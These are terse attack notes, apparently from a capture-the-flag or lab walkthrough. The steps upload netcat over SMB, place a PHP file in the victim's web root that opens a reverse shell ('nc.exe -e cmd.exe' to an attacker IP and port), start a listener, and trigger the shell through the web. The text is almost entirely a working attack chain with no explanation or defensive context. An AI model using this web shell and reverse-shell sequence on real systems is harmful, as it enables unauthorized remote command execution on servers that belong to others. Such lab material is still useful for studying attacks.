smb: \> put nc.exe

Create file rev.php
gedit rev.php
<?php
system('nc.exe -e cmd.exe 10.10.14.25 4444')
?>

upload file rev.php to web root folder on Victim machine via smb  
smb: \> put rev.php

â”€# nc -nvlp 4444                                
listening on [any] 4444 ...

Access file rev.php on web
